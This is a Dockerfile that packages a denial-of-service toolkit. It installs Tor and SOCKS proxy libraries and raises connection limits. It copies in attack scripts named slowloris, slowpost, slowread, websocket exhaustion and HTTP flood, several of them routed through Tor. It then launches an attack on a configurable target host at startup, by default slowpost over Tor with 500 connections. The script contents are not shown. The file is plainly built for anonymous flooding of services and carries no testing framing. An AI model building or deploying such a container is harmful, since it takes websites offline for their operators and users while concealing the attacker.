FROM python:3.11-slim

RUN apt-get update && \
    apt-get install -y --no-install-recommends curl tor && \
    pip install --no-cache-dir PySocks python-socks[asyncio] && \
    rm -rf /var/lib/apt/lists/*

RUN echo "* soft nofile 65535" >> /etc/security/limits.conf && \
    echo "* hard nofile 65535" >> /etc/security/limits.conf

WORKDIR /app
COPY start.sh bulldosser_tor.sh \
     request_loader.py \
     slowloris.py slowloris_tor.py \
     slowpost.py slowpost_tor.py \
     slowread.py ws_exhaust.py \
     http_flood.py \
     /app/

RUN chmod +x start.sh bulldosser_tor.sh

ENV CONTAINER_NAME=instance-1 \
    TARGET_HOST=target.com \
    TARGET_PORT=443 \
    ATTACK_METHOD=slowpost_tor \
    CONNECTIONS=500 \
    REQUEST_DATA=""

CMD ["/app/start.sh"]
